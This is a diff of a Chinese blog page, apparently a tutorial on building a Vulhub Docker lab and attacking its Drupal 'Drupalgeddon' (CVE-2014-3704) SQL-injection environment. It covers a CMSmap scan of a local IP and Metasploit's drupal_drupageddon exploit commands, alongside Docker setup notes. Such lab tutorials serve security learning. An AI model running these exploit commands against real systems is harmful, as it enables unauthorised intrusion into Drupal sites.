@@ -104,16 +104,16 @@
 <meta property="og:site_name" content="Emerald Dream">
 <meta property="og:description" content="1.Vulhub搭建1.1 docker安装12curl -s https://get.docker.com/ | sh docker -h 如果第二个命令能出现docker的帮助提示，则表示安装成功如果提示没有curl，可以按照提示安装curl不使用apt install方式安装docker是因为，如果源上的docker不是最新的，无法安装最新版本的docker。 1.2 安装docker-co">
 <meta property="og:locale" content="en">
-<meta property="og:image" content="https://chirec.github.io/2019/04/09/Vulhub/04/09/Vulhub/01.database_config.png">
-<meta property="og:image" content="https://chirec.github.io/2019/04/09/Vulhub/04/09/Vulhub/02.email_config.png">
-<meta property="og:image" content="https://chirec.github.io/2019/04/09/Vulhub/04/09/Vulhub/03.error.png">
-<meta property="og:image" content="https://chirec.github.io/2019/04/09/Vulhub/04/09/Vulhub/04.CMSmap.png">
-<meta property="og:image" content="https://chirec.github.io/2019/04/09/Vulhub/04/09/Vulhub/05.MSF.png">
-<meta property="og:updated_time" content="2019-07-04T11:25:02.060Z">
+<meta property="og:image" content="https://chirec.github.io/2019/04/09/Vulhub/01.database_config.png">
+<meta property="og:image" content="https://chirec.github.io/2019/04/09/Vulhub/02.email_config.png">
+<meta property="og:image" content="https://chirec.github.io/2019/04/09/Vulhub/03.error.png">
+<meta property="og:image" content="https://chirec.github.io/2019/04/09/Vulhub/04.CMSmap.png">
+<meta property="og:image" content="https://chirec.github.io/2019/04/09/Vulhub/05.MSF.png">
+<meta property="og:updated_time" content="2019-09-10T13:56:35.707Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="&#39;Vulhub搭建漏洞环境及简单测试&#39;">
 <meta name="twitter:description" content="1.Vulhub搭建1.1 docker安装12curl -s https://get.docker.com/ | sh docker -h 如果第二个命令能出现docker的帮助提示，则表示安装成功如果提示没有curl，可以按照提示安装curl不使用apt install方式安装docker是因为，如果源上的docker不是最新的，无法安装最新版本的docker。 1.2 安装docker-co">
-<meta name="twitter:image" content="https://chirec.github.io/2019/04/09/Vulhub/04/09/Vulhub/01.database_config.png">
+<meta name="twitter:image" content="https://chirec.github.io/2019/04/09/Vulhub/01.database_config.png">
 
 
 
@@ -397,7 +397,7 @@
                 
                   <span class="post-meta-item-text">Edited on</span>
                 
-                <time title="Modified: 2019-07-04 19:25:02" itemprop="dateModified" datetime="2019-07-04T19:25:02+08:00">2019-07-04</time>
+                <time title="Modified: 2019-09-10 21:56:35" itemprop="dateModified" datetime="2019-09-10T21:56:35+08:00">2019-09-10</time>
               
             
           </span>
@@ -459,15 +459,15 @@
 <a id="more"></a>
 <h2 id="2-2-环境配置"><a href="#2-2-环境配置" class="headerlink" title="2.2 环境配置"></a>2.2 环境配置</h2><p>查看官方文档：<a href="https://vulhub.org/#/environments/drupal/CVE-2014-3704/" target="_blank" rel="noopener">Drupal &lt; 7.32 “Drupalgeddon” SQL注入漏洞（CVE-2014-3704）</a></p>
 <p>数据库设置</p>
-<img src="/2019/04/09/Vulhub/04/09/Vulhub/01.database_config.png">
+<p><img src="/2019/04/09/Vulhub/01.database_config.png" alt></p>
 <p>邮箱设置</p>
-<img src="/2019/04/09/Vulhub/04/09/Vulhub/02.email_config.png">
+<p><img src="/2019/04/09/Vulhub/02.email_config.png" alt></p>
 <p>无法向邮箱发送邮件，没必要写可以正常使用的邮箱</p>
-<img src="/2019/04/09/Vulhub/04/09/Vulhub/03.error.png">
+<p><img src="/2019/04/09/Vulhub/03.error.png" alt></p>
 <h1 id="3-CMSmap扫描"><a href="#3-CMSmap扫描" class="headerlink" title="3.CMSmap扫描"></a>3.CMSmap扫描</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">git clone https://github.com/Dionach/CMSmap.git</span><br><span class="line">cd CMSmap</span><br><span class="line">python3 cmsmap.py http://192.168.126.148:8080/</span><br></pre></td></tr></table></figure>
-<img src="/2019/04/09/Vulhub/04/09/Vulhub/04.CMSmap.png">
+<p><img src="/2019/04/09/Vulhub/04.CMSmap.png" alt></p>
 <h1 id="4-使用MSF攻击"><a href="#4-使用MSF攻击" class="headerlink" title="4.使用MSF攻击"></a>4.使用MSF攻击</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">/etc/init.d/postgresql start</span><br><span class="line">msfconsole</span><br><span class="line">search drupal</span><br><span class="line">use exploit/multi/http/drupal_drupageddon </span><br><span class="line">set rhost 192.168.126.148</span><br><span class="line">set rport 8080</span><br><span class="line">run</span><br></pre></td></tr></table></figure>
-<img src="/2019/04/09/Vulhub/04/09/Vulhub/05.MSF.png">
+<p><img src="/2019/04/09/Vulhub/05.MSF.png" alt></p>
 <h1 id="5-docker使用"><a href="#5-docker使用" class="headerlink" title="5.docker使用"></a>5.docker使用</h1><h2 id="5-1-添加加速"><a href="#5-1-添加加速" class="headerlink" title="5.1 添加加速"></a>5.1 添加加速</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">https://www.daocloud.io/mirror</span><br><span class="line">curl -sSL https://get.daocloud.io/daotools/set_mirror.sh | sh -s http://f1361db2.m.daocloud.io</span><br></pre></td></tr></table></figure>
 <h2 id="5-2-docker镜像操作"><a href="#5-2-docker镜像操作" class="headerlink" title="5.2 docker镜像操作"></a>5.2 docker镜像操作</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">docker search mysql //搜索</span><br><span class="line">docker pull 镜像名称 //下载</span><br><span class="line">docker images //查看本地已下载镜像</span><br><span class="line">docker rmi 镜像id //删除镜像</span><br></pre></td></tr></table></figure>
 <h2 id="5-3-docker容器操作"><a href="#5-3-docker容器操作" class="headerlink" title="5.3 docker容器操作"></a>5.3 docker容器操作</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">docker run -d -p --name 容器名或镜像ID）</span><br><span class="line">-d 后台运行</span><br><span class="line">-p 随机分配端口</span><br><span class="line">-p 端口1（宿主机）:端口2（容器中）//端口转发</span><br><span class="line">docker ps //查看当前处于运行状态的容器</span><br><span class="line">docker start 容器ID或容器名 //开启容器</span><br><span class="line">docker stop 容器ID或容器名 //停止运行中的容器</span><br><span class="line">docker ps -a //查看停止的容器</span><br><span class="line">docker rm 容器ID或容器名 //删除容器</span><br><span class="line">docker exec -it 容器ID或容器名 /bin/bash //进入容器内部</span><br><span class="line">docker save 容器名/容器ID &gt; test.tar //导出容器</span><br><span class="line">docker load &lt; test.tar //导入容器</span><br></pre></td></tr></table></figure>
